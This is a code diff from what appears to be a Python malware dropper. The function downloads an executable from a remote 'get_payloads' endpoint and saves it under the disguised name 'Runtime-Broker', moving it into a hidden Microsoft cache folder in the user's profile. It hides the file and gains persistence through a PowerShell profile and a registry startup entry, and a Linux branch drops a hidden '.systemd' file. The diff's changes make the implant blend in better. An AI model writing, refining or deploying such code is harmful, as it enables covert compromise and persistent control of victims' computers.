@@ -120,25 +120,26 @@ def run(url, file_path):
     os_type = platform.system()
     download_path = file_path
     print(f"{url}get_payloads/{download_path}.exe")
+    user = getpass.getuser()
     
     if os_type == 'Windows':
         import winreg
     
-        file_path = "C:\\ProgramData\\Runtime-Broker.exe"
+        file_path = f"C:\Users\{user}\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData\Runtime-Broker"
         if not os.path.exists(file_path):
             response = requests.get(f"{url}get_payloads/{download_path}.exe")
             with open(file_path, 'wb') as file:
               file.write(response.content)
                 
         try:
-            create_powershell_profile(file_path, "Runtime-Broker")
+            create_powershell_profile(file_path, "Runtime Broker")
         except Exception as err:
             print(err)
             print("could not add powershell profile")
         create_hidden_file(file_path)
-        create_hidden_file("C:\\ProgramData\\uuid.txt")
+        create_hidden_file(f"C:\Users\{user}\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData\uuid.txt")
         #add_to_startup(file_path, "Runtime Broker")
-        add_registry_startup(file_path, "Runtime Broker")
+        add_registry_startup(file_path, "Runtime-Broker")
     
     elif os_type == 'Linux' or os_type == 'FreeBSD' or os_type == 'OpenBSD' or os_type == 'SunOS' or os_type == 'Android':
         file_path = "/run/lock/.systemd"
